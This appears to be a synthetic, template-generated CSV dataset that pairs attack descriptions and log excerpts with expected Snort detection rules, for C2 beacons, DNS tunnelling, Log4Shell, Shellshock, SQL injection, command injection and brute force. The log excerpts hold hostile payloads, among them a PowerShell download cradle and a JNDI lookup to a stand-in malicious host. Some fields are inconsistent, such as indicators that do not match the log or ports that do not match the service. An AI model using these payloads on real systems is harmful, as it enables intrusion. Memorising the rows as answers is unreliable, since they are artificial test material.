doc_id,attack_description,description_style,attack_family,attack_type,protocol,source_zone,destination_zone,source_port,destination_port,service,payload_pattern,log_excerpt,expected_snort_rule,rule_explanation,severity,false_positive_risk,mitre_technique,keywords,synthetic_generation_method,needs_retrieval
SNORT_0011,Need IDS detection logic for HTTP C2 Beacon: Generate a rule for possible malware C2 HTTP beacon traffic. Include protocol and threshold constraints.,technical,Malware_C2,HTTP C2 Beacon,tcp,$HOME_NET,$EXTERNAL_NET,any,8080,HTTP-alt,User-Agent,Proxy log: repeated small HTTP requests with fixed interval from host 10.0.6.55,"alert tcp $HOME_NET any -> $EXTERNAL_NET 8080 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000011; rev:1;)","This Snort rule is designed for HTTP C2 Beacon in the Malware_C2 family. It monitors TCP traffic on destination port 8080 (HTTP-alt) and uses indicators such as User-Agent. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",critical,medium,T1071.001 Web Protocols,"c2, beacon, malware, http, periodic",manual template + controlled random variations,True
SNORT_0012,Identify malware staging using powershell and DownloadString keywords.,formal,Malware_C2,PowerShell Download Cradle,tcp,$HOME_NET,$EXTERNAL_NET,any,443,HTTPS,powershell,POST /cmd body=powershell -nop -w hidden IEX(New-Object Net.WebClient).DownloadString(...) src=10.0.7.188,"alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (msg:""Possible PowerShell download cradle""; flow:to_server,established; content:""powershell""; nocase; content:""DownloadString""; nocase; classtype:trojan-activity; sid:1000012; rev:1;)","This Snort rule is designed for PowerShell Download Cradle in the Malware_C2 family. It monitors TCP traffic on destination port 443 (HTTPS) and uses indicators such as powershell. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",critical,low,T1059.001 PowerShell,"powershell, download, malware, payload, c2",manual template + controlled random variations,True
SNORT_0013,SOC ticket: suspicious DNS_Attack activity observed. Generate a rule for suspected DNS tunneling over port 53.,incident_ticket,DNS_Attack,DNS Tunneling,udp,$HOME_NET,$EXTERNAL_NET,any,53,DNS,base64-like,Resolver log: many long subdomain TXT queries from host 10.0.8.178,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""Possible DNS tunneling via TXT queries""; content:""|00 10|""; offset:2; detection_filter:track by_src, count 25, seconds 60; classtype:policy-violation; sid:1000013; rev:1;)","This Snort rule is designed for DNS Tunneling in the DNS_Attack family. It monitors UDP traffic on destination port 53 (DNS) and uses indicators such as base64-like. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,medium,T1071.004 DNS,"dns, tunneling, long subdomain, txt, exfiltration",manual template + controlled random variations,True
SNORT_0014,Rule for dns amplification on the network.,short,DNS_Attack,DNS Amplification,udp,$HOME_NET,$EXTERNAL_NET,any,53,DNS,ANY query,DNS query type=ANY domain=example.org src=203.0.113.68 count=89,"alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:""Possible DNS amplification ANY query abuse""; content:""|00 FF|""; offset:2; detection_filter:track by_src, count 40, seconds 20; classtype:attempted-dos; sid:1000014; rev:1;)","This Snort rule is designed for DNS Amplification in the DNS_Attack family. It monitors UDP traffic on destination port 53 (DNS) and uses indicators such as ANY query. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,medium,T1498 Network Denial of Service,"dns, amplification, any, dos",manual template + controlled random variations,True
SNORT_0015,Rule for log4shell jndi pattern on the network.,short,Exploitation,Log4Shell JNDI Pattern,tcp,$EXTERNAL_NET,$HOME_NET,any,8080,HTTP-alt,rmi://,GET /?q=${jndi:ldap://malicious.example/a} HTTP/1.1 user-agent=probe,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8080 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000015; rev:1;)","This Snort rule is designed for Log4Shell JNDI Pattern in the Exploitation family. It monitors TCP traffic on destination port 8080 (HTTP-alt) and uses indicators such as rmi://. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",critical,low,T1190 Exploit Public-Facing Application,"log4j, jndi, ldap, exploit, web",manual template + controlled random variations,True
SNORT_0016,SOC ticket: suspicious Exploitation activity observed. Detect Shellshock exploitation attempts in HTTP headers.,incident_ticket,Exploitation,Shellshock CGI Pattern,tcp,$EXTERNAL_NET,$HOME_NET,any,443,HTTPS,/bin/bash,HTTP header contains Bash function pattern targeting /cgi-bin/status,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible Shellshock CGI exploit attempt""; flow:to_server,established; content:""() {""; http_header; classtype:web-application-attack; sid:1000016; rev:1;)","This Snort rule is designed for Shellshock CGI Pattern in the Exploitation family. It monitors TCP traffic on destination port 443 (HTTPS) and uses indicators such as /bin/bash. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",critical,low,T1190 Exploit Public-Facing Application,"shellshock, cgi, bash, exploit, web",manual template + controlled random variations,True
SNORT_0017,Rule for cleartext password exposure on the network.,short,Policy_Violation,Cleartext Password Exposure,tcp,$HOME_NET,$EXTERNAL_NET,any,143,IMAP,pwd=,POST /login body=username=alice&password=Summer2026 src=10.0.9.192,"alert tcp $HOME_NET any -> $EXTERNAL_NET 143 (msg:""Possible cleartext password exposure""; flow:to_server,established; pcre:""/(password=|pwd=|PASS\s+)/Ui""; classtype:policy-violation; sid:1000017; rev:1;)","This Snort rule is designed for Cleartext Password Exposure in the Policy_Violation family. It monitors TCP traffic on destination port 143 (IMAP) and uses indicators such as pwd=. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",medium,medium,T1552 Unsecured Credentials,"cleartext, password, credentials, policy",manual template + controlled random variations,True
SNORT_0018,"As a security analyst, I want to detect this behavior: Identify a possible port scan where one source sends many SYN packets to SMTP on port 25.",analyst_request,Reconnaissance,TCP SYN Port Scan,tcp,$EXTERNAL_NET,$HOME_NET,any,25,SMTP,SYN probe,IDS flow: repeated SYN packets from 198.51.100.239 to 10.0.2.151:25 in 10 seconds,"alert tcp $EXTERNAL_NET any -> $HOME_NET 25 (msg:""Possible TCP SYN scan against SMTP""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000018; rev:1;)","This Snort rule is designed for TCP SYN Port Scan in the Reconnaissance family. It monitors TCP traffic on destination port 25 (SMTP) and uses indicators such as SYN probe. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",medium,medium,T1046 Network Service Discovery,"scan, syn, port, reconnaissance, nmap",manual template + controlled random variations,True
SNORT_0019,Need IDS detection logic for ICMP Ping Sweep: Detect an ICMP ping sweep where one source probes many internal hosts. Include protocol and threshold constraints.,technical,Reconnaissance,ICMP Ping Sweep,icmp,$EXTERNAL_NET,$HOME_NET,any,any,generic network,icmp echo,Firewall log: ICMP echo requests to multiple hosts from 198.51.100.33,"alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""Possible ICMP ping sweep""; itype:8; detection_filter:track by_src, count 30, seconds 20; classtype:network-scan; sid:1000019; rev:1;)","This Snort rule is designed for ICMP Ping Sweep in the Reconnaissance family. It monitors ICMP traffic on destination port any (generic network) and uses indicators such as icmp echo. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",low,medium,T1018 Remote System Discovery,"icmp, ping, sweep, reconnaissance, echo",manual template + controlled random variations,True
SNORT_0020,Need IDS detection logic for TCP SYN Flood: Detect a TCP SYN flood targeting the HTTP service on port 80. Include protocol and threshold constraints.,technical,DoS_DDoS,TCP SYN Flood,tcp,$EXTERNAL_NET,$HOME_NET,any,80,HTTP,high syn rate,Netflow anomaly: high half-open TCP SYN rate to 10.0.2.18:80,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible TCP SYN flood against HTTP""; flags:S; detection_filter:track by_dst, count 200, seconds 5; classtype:attempted-dos; sid:1000020; rev:1;)","This Snort rule is designed for TCP SYN Flood in the DoS_DDoS family. It monitors TCP traffic on destination port 80 (HTTP) and uses indicators such as high syn rate. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,medium,T1498 Network Denial of Service,"syn flood, dos, ddos, tcp, web",manual template + controlled random variations,True
SNORT_0021,SOC ticket: suspicious DoS_DDoS activity observed. Identify possible UDP denial-of-service traffic on port 500.,incident_ticket,DoS_DDoS,UDP Flood,udp,$EXTERNAL_NET,$HOME_NET,any,500,IKE,high udp rate,Collector: UDP packets to 10.0.4.222:500 exceed baseline by 800%,"alert udp $EXTERNAL_NET any -> $HOME_NET 500 (msg:""Possible UDP flood on IKE""; detection_filter:track by_dst, count 300, seconds 10; classtype:attempted-dos; sid:1000021; rev:1;)","This Snort rule is designed for UDP Flood in the DoS_DDoS family. It monitors UDP traffic on destination port 500 (IKE) and uses indicators such as high udp rate. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,medium,T1498 Network Denial of Service,"udp, flood, dos, amplification",manual template + controlled random variations,True
SNORT_0022,Identify malicious HTTP traffic with UNION SELECT payloads against HTTP-alt.,formal,Web_Attack,SQL Injection,tcp,$EXTERNAL_NET,$HOME_NET,any,8080,HTTP-alt,UNION SELECT,HTTP URI contains /login.php?user=admin' OR '1'='1 from 203.0.113.206,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8080 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000022; rev:1;)","This Snort rule is designed for SQL Injection in the Web_Attack family. It monitors TCP traffic on destination port 8080 (HTTP-alt) and uses indicators such as UNION SELECT. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,low,T1190 Exploit Public-Facing Application,"sql injection, sqli, union, select, web",manual template + controlled random variations,True
SNORT_0023,SOC ticket: suspicious Web_Attack activity observed. Create a rule for HTTP URI containing encoded or clear script payloads.,incident_ticket,Web_Attack,Cross Site Scripting,tcp,$EXTERNAL_NET,$HOME_NET,any,80,HTTP,onerror=,GET /search?q=<script>alert(1)</script> HTTP/1.1 host=portal.local,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible reflected XSS script tag""; flow:to_server,established; content:""<script""; nocase; http_uri; classtype:web-application-attack; sid:1000023; rev:1;)","This Snort rule is designed for Cross Site Scripting in the Web_Attack family. It monitors TCP traffic on destination port 80 (HTTP) and uses indicators such as onerror=. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",medium,medium,T1189 Drive-by Compromise,"xss, script, javascript, web",manual template + controlled random variations,True
SNORT_0024,"As a security analyst, I want to detect this behavior: Generate a Snort rule for path traversal targeting sensitive files.",analyst_request,Web_Attack,Directory Traversal,tcp,$EXTERNAL_NET,$HOME_NET,any,8080,HTTP-alt,../,GET /download?file=../../../../etc/passwd HTTP/1.1 host=app.local,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8080 (msg:""Possible directory traversal attempt""; flow:to_server,established; content:""../""; http_uri; classtype:web-application-attack; sid:1000024; rev:1;)","This Snort rule is designed for Directory Traversal in the Web_Attack family. It monitors TCP traffic on destination port 8080 (HTTP-alt) and uses indicators such as ../. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,low,T1190 Exploit Public-Facing Application,"directory traversal, path traversal, etc passwd, web",manual template + controlled random variations,True
SNORT_0025,"As a security analyst, I want to detect this behavior: Create a Snort rule for web requests containing whoami or id after command separators.",analyst_request,Web_Attack,Command Injection,tcp,$EXTERNAL_NET,$HOME_NET,any,8080,HTTP-alt,;cat /etc/passwd,GET /ping?host=127.0.0.1;whoami HTTP/1.1 src=198.51.100.49,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8080 (msg:""Possible HTTP command injection""; flow:to_server,established; pcre:""/(;|\||&&)(whoami|id|cat)/Ui""; classtype:web-application-attack; sid:1000025; rev:1;)","This Snort rule is designed for Command Injection in the Web_Attack family. It monitors TCP traffic on destination port 8080 (HTTP-alt) and uses indicators such as ;cat /etc/passwd. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",critical,medium,T1059 Command and Scripting Interpreter,"command injection, whoami, cat, shell, web",manual template + controlled random variations,True
SNORT_0026,Rule for ssh brute force on the network.,short,Brute_Force,SSH Brute Force,tcp,$EXTERNAL_NET,$HOME_NET,any,22,SSH,auth failure,tcp flow src=198.51.100.14 dst=10.0.5.30:22 sessions=25 in 60s,"alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:""Possible SSH brute force attempts""; flow:to_server,established; detection_filter:track by_src, count 15, seconds 60; classtype:attempted-recon; sid:1000026; rev:1;)","This Snort rule is designed for SSH Brute Force in the Brute_Force family. It monitors TCP traffic on destination port 22 (SSH) and uses indicators such as auth failure. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,medium,T1110 Brute Force,"ssh, brute force, login, authentication",manual template + controlled random variations,True
SNORT_0027,Detect repeated FTP USER commands that may indicate brute force.,formal,Brute_Force,FTP Brute Force,tcp,$EXTERNAL_NET,$HOME_NET,any,21,FTP,USER,ftp auth failed user=admin src=203.0.113.234 dst=10.0.5.147 attempts=31,"alert tcp $EXTERNAL_NET any -> $HOME_NET 21 (msg:""Possible FTP brute force USER attempts""; flow:to_server,established; content:""USER""; nocase; detection_filter:track by_src, count 20, seconds 60; classtype:attempted-recon; sid:1000027; rev:1;)","This Snort rule is designed for FTP Brute Force in the Brute_Force family. It monitors TCP traffic on destination port 21 (FTP) and uses indicators such as USER. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",medium,medium,T1110 Brute Force,"ftp, brute force, user, pass",manual template + controlled random variations,True
SNORT_0028,SOC ticket: suspicious Malware_C2 activity observed. Identify repeated outbound HTTP requests that look like command-and-control.,incident_ticket,Malware_C2,HTTP C2 Beacon,tcp,$HOME_NET,$EXTERNAL_NET,any,80,HTTP,beacon,HTTP GET /gate.php every=60s user-agent=Mozilla/4.0 src=10.0.6.138 dst=198.51.100.204,"alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000028; rev:1;)","This Snort rule is designed for HTTP C2 Beacon in the Malware_C2 family. It monitors TCP traffic on destination port 80 (HTTP) and uses indicators such as beacon. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",critical,medium,T1071.001 Web Protocols,"c2, beacon, malware, http, periodic",manual template + controlled random variations,True
SNORT_0029,SOC ticket: suspicious Malware_C2 activity observed. Identify malware staging using powershell and DownloadString keywords.,incident_ticket,Malware_C2,PowerShell Download Cradle,tcp,$HOME_NET,$EXTERNAL_NET,any,80,HTTP,Invoke-Expression,POST /cmd body=powershell -nop -w hidden IEX(New-Object Net.WebClient).DownloadString(...) src=10.0.7.137,"alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:""Possible PowerShell download cradle""; flow:to_server,established; content:""powershell""; nocase; content:""DownloadString""; nocase; classtype:trojan-activity; sid:1000029; rev:1;)","This Snort rule is designed for PowerShell Download Cradle in the Malware_C2 family. It monitors TCP traffic on destination port 80 (HTTP) and uses indicators such as Invoke-Expression. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",critical,low,T1059.001 PowerShell,"powershell, download, malware, payload, c2",manual template + controlled random variations,True
SNORT_0030,"As a security analyst, I want to detect this behavior: Detect repeated DNS TXT queries with long encoded-looking subdomains.",analyst_request,DNS_Attack,DNS Tunneling,udp,$HOME_NET,$EXTERNAL_NET,any,53,DNS,TXT query,DNS query type=TXT name=dk39fj29skd92ks9d.example.net src=10.0.8.81 count=47,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""Possible DNS tunneling via TXT queries""; content:""|00 10|""; offset:2; detection_filter:track by_src, count 25, seconds 60; classtype:policy-violation; sid:1000030; rev:1;)","This Snort rule is designed for DNS Tunneling in the DNS_Attack family. It monitors UDP traffic on destination port 53 (DNS) and uses indicators such as TXT query. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,medium,T1071.004 DNS,"dns, tunneling, long subdomain, txt, exfiltration",manual template + controlled random variations,True
SNORT_0031,"As a security analyst, I want to detect this behavior: Create a rule for DNS amplification attempts using query type ANY.",analyst_request,DNS_Attack,DNS Amplification,udp,$HOME_NET,$EXTERNAL_NET,any,53,DNS,ANY query,UDP/53 ANY requests from one source exceed threshold,"alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:""Possible DNS amplification ANY query abuse""; content:""|00 FF|""; offset:2; detection_filter:track by_src, count 40, seconds 20; classtype:attempted-dos; sid:1000031; rev:1;)","This Snort rule is designed for DNS Amplification in the DNS_Attack family. It monitors UDP traffic on destination port 53 (DNS) and uses indicators such as ANY query. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,medium,T1498 Network Denial of Service,"dns, amplification, any, dos",manual template + controlled random variations,True
SNORT_0032,Generate a Snort rule for HTTP payloads with ${jndi: patterns.,formal,Exploitation,Log4Shell JNDI Pattern,tcp,$EXTERNAL_NET,$HOME_NET,any,80,HTTP,${jndi:,GET /?q=${jndi:ldap://malicious.example/a} HTTP/1.1 user-agent=probe,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000032; rev:1;)","This Snort rule is designed for Log4Shell JNDI Pattern in the Exploitation family. It monitors TCP traffic on destination port 80 (HTTP) and uses indicators such as ${jndi:. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",critical,low,T1190 Exploit Public-Facing Application,"log4j, jndi, ldap, exploit, web",manual template + controlled random variations,True
SNORT_0033,Identify HTTP requests containing the Shellshock () { pattern.,formal,Exploitation,Shellshock CGI Pattern,tcp,$EXTERNAL_NET,$HOME_NET,any,80,HTTP,() {,User-Agent: () { :;}; /bin/bash -c 'id' src=198.51.100.27,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible Shellshock CGI exploit attempt""; flow:to_server,established; content:""() {""; http_header; classtype:web-application-attack; sid:1000033; rev:1;)","This Snort rule is designed for Shellshock CGI Pattern in the Exploitation family. It monitors TCP traffic on destination port 80 (HTTP) and uses indicators such as () {. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",critical,low,T1190 Exploit Public-Facing Application,"shellshock, cgi, bash, exploit, web",manual template + controlled random variations,True
SNORT_0034,"As a security analyst, I want to detect this behavior: Detect possible cleartext password exposure in unencrypted traffic.",analyst_request,Policy_Violation,Cleartext Password Exposure,tcp,$HOME_NET,$EXTERNAL_NET,any,110,POP3,PASS ,POST /login body=username=alice&password=Summer2026 src=10.0.9.173,"alert tcp $HOME_NET any -> $EXTERNAL_NET 110 (msg:""Possible cleartext password exposure""; flow:to_server,established; pcre:""/(password=|pwd=|PASS\s+)/Ui""; classtype:policy-violation; sid:1000034; rev:1;)","This Snort rule is designed for Cleartext Password Exposure in the Policy_Violation family. It monitors TCP traffic on destination port 110 (POP3) and uses indicators such as PASS . The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",medium,medium,T1552 Unsecured Credentials,"cleartext, password, credentials, policy",manual template + controlled random variations,True
